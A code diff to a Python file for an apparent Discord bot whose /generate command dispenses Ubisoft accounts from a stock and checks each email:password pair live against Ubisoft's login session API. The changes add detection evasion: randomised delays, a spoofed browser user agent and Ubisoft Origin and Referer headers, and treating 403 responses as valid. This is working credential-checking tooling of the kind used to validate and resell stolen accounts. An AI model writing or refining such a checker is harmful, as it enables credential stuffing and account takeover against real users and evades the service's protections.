@@ -4,6 +4,7 @@ generate.py — /generate command with LIVE Ubisoft account checking.
 
 import asyncio
 import time
+import random
 import discord
 import base64
 import aiohttp
@@ -94,27 +95,33 @@ async def is_account_valid(account_str: str) -> bool:
 
     email, password = creds.split(":", 1)
     
-    # New active App ID
     UBI_APP_ID = "314d4fef-e568-454a-ae06-43e3bece12a6" 
     url = "https://public-ubiservices.ubi.com/v3/profiles/sessions"
     
     b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
+    
     headers = {
         "Content-Type": "application/json",
         "Ubi-AppId": UBI_APP_ID,
         "Authorization": f"Basic {b64_auth}",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "Accept": "application/json",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Origin": "https://account.ubisoft.com",
+        "Referer": "https://account.ubisoft.com/"
     }
 
     try:
+        await asyncio.sleep(random.uniform(1.5, 3.5)) 
+        
         async with aiohttp.ClientSession() as session:
-            async with session.post(url, headers=headers, json={"rememberMe": True}, timeout=4) as res:
+            async with session.post(url, headers=headers, json={"rememberMe": True}, timeout=8) as res:
                 if res.status == 200:
                     return True
                 if res.status == 401:
                     return False
-                # 400 = bad app id, 429 = rate limit, 403 = forbidden
-                # we assume valid so we don't wipe stock on a network error
+                if res.status == 403:
+                    return True 
                 return True 
     except Exception:
         return True 
